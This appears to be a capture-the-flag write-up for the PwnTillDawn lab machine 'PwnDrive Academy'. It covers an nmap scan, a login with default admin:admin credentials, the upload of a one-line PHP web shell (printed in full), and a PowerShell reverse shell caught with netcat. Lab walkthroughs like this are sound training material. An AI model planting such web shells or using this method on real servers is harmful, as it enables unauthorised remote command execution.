### PwnDrive Academy PwntillDawn

### IP Address = 10.150.150.11

### Difficulty = Easy

### OS = windows
Hi guys,
<br> Will be walking you through a pwntilldawn easy box "pwndriveacademy"
<br> Let's begin the hacks :) .

## NMAP SCAN:

```

┌──(venus㉿AL13N)-[~]
└─$ nmap -A -T5 10.150.150.11                         
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-03 22:17 WAT
Warning: 10.150.150.11 giving up on port because retransmission cap hit (2).

** (atril:3324): WARNING **: 22:19:20.176: Error setting file metadata: No such file or directory
Nmap scan report for 10.150.150.11
Host is up (0.19s latency).
Not shown: 980 closed tcp ports (conn-refused)
PORT      STATE    SERVICE            VERSION
21/tcp    open     ftp                Xlight ftpd 3.9
80/tcp    open     http               Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
|_http-title: PwnDrive - Your Personal Online Storage
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
306/tcp   filtered unknown
443/tcp   open     ssl/http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: PwnDrive - Your Personal Online Storage
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
445/tcp   open     microsoft-ds       Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds
1110/tcp  filtered nfsd-status
1433/tcp  open     ms-sql-s           Microsoft SQL Server 2012 11.00.2100.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-08-24T13:11:13
|_Not valid after:  2050-08-24T13:11:13
|_ssl-date: 2023-06-03T22:06:39+00:00; +46m37s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: PWNDRIVE
|   NetBIOS_Domain_Name: PWNDRIVE
|   NetBIOS_Computer_Name: PWNDRIVE
|   DNS_Domain_Name: PwnDrive
|   DNS_Computer_Name: PwnDrive
|_  Product_Version: 6.1.7601
3306/tcp  open     mysql              MySQL 5.5.5-10.4.14-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.14-MariaDB
|   Thread ID: 1053
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, Speaks41ProtocolOld, LongColumnFlag, Support41Auth, SupportsTransactions, InteractiveClient, Speaks41ProtocolNew, IgnoreSigpipes, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, SupportsCompression, ODBCClient, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: jDU_\3&cCbDmy9MYU}9B
|_  Auth Plugin Name: mysql_native_password
3371/tcp  filtered satvid-datalnk
3389/tcp  open     ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=PwnDrive
| Not valid before: 2023-06-02T18:08:29
|_Not valid after:  2023-12-02T18:08:29
|_ssl-date: 2023-06-03T22:06:37+00:00; +46m37s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: PWNDRIVE
|   NetBIOS_Domain_Name: PWNDRIVE
|   NetBIOS_Computer_Name: PWNDRIVE
|   DNS_Domain_Name: PwnDrive
|   DNS_Computer_Name: PwnDrive
|   Product_Version: 6.1.7601
|_  System_Time: 2023-06-03T22:06:29+00:00
5631/tcp  filtered pcanywheredata
8042/tcp  filtered fs-agent
49152/tcp open     msrpc              Microsoft Windows RPC
49153/tcp open     msrpc              Microsoft Windows RPC
49154/tcp open     msrpc              Microsoft Windows RPC
49155/tcp open     msrpc              Microsoft Windows RPC
49156/tcp open     msrpc              Microsoft Windows RPC
49157/tcp open     msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.150.150.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2012 RTM
|       number: 11.00.2100.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: PwnDrive
|   NetBIOS computer name: PWNDRIVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-03T15:06:29-07:00
|_clock-skew: mean: 1h46m37s, deviation: 2h38m45s, median: 46m36s
| smb2-time: 
|   date: 2023-06-03T22:06:29
|_  start_date: 2020-08-24T13:11:20
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: PWNDRIVE, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:89:87:cb (VMware)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.34 seconds

```

From the scan it shows the box is running on a windows OS

<br> so, enumerating port 21 (ftp) gives nothing. 

<br> Then moving on to the next port which's port 80(http)

<br> we can see that there's nothing intresting on the page except the *signin* functionality

<br> so, let's try to signin using default credentials **admin:admin** 

![2023-06-03_22-45](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/af1826b2-aa06-4337-b2d7-55d26d90e0ca)

boom we are in the admin's panel.

<br> AS you can see there is an upload functionality,let's try to upload a shell (NB: the server is running php. Php web shell should work)

![succ_upload](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/1d05b3a7-0383-459d-afa3-97d66d5b38f2)
wow our shell has been uploaded successfully.
~~~
the shell
<?php system($_GET['cmd']); ?>
~~~
so, let's find our uploaded shell by bruteforcing for directories using ffuf
![finding_upload](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/0f28f198-8eb0-433f-8000-c84fb1178698)
Good we found it ;)

Now lets's gain  reverse shell via our uploaded webshell
![revrsjpg](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/a68e92f2-b193-41dc-958b-0f0b2f1ea797)
i used a powershell reverse shell from [revshells](https://revshells.com/) .
<br> Then start netcat listener and press F5 to refresh the page.
![done](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/8c23decd-9d37-41df-834a-846a6ea9a815)

BOOM!!  sweet reverse shell ;)

luckily we got the shell as system , escalating privilege isn't required.

DONE!!

*Till another day 999 to the world*

